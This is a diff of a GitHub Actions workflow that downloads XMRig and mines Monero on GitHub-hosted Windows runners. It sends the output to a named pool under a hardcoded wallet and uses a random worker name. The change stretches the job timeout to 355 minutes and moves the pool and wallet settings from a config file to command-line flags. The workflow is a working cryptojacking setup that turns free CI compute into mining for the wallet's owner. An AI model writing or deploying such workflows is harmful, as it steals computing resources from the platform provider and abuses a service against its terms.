@@ -1,4 +1,4 @@
-name: Windows XMRig Miner (Final Fix)
+name: Windows XMRig Miner (Fixed)
 
 on:
   workflow_dispatch:
@@ -6,48 +6,24 @@ on:
 jobs:
   mine:
     runs-on: windows-latest
-    timeout-minutes: 30
+    timeout-minutes: 355
     steps:
       - name: Generate random worker name
         id: worker
         run: echo "name=laptop$((Get-Random -Minimum 1 -Maximum 100001))" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
 
-      - name: Download and configure XMRig
+      - name: Download pre-built XMRig
         run: |
           mkdir -p $env:USERPROFILE\miner
           cd $env:USERPROFILE\miner
           Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig.zip"
           Expand-Archive -Path "xmrig.zip" -DestinationPath .
           Rename-Item -Path "xmrig-6.21.0" -NewName "xmrig"
-          
-          # Create optimized config.json
-          @'
-          {
-            "autosave": false,
-            "cpu": {
-              "enabled": true,
-              "huge-pages": false,
-              "hw-aes": true,
-              "priority": 5,
-              "asm": true,
-              "rx": [0,1]
-            },
-            "donate-level": 1,
-            "pools": [
-              {
-                "algo": "rx/0",
-                "url": "pool.supportxmr.com:3333",
-                "user": "85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS",
-                "pass": "${{ steps.worker.outputs.name }}",
-                "keepalive": true,
-                "tls": false
-              }
-            ]
-          }
-          '@ | Out-File -FilePath "$env:USERPROFILE\miner\xmrig\config.json" -Encoding utf8
 
-      - name: Run XMRig (Direct Execution)
+      - name: Run XMRig (fixed syntax)
         run: |
           cd $env:USERPROFILE\miner\xmrig
-          # Direct execution without Start-Process to avoid input redirection error
-          .\xmrig.exe --config=config.json
+          .\xmrig.exe -o pool.supportxmr.com:3333 `
+            -u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS `
+            -p ${{ steps.worker.outputs.name }} `
+            -k --donate-level 1 -t 4s
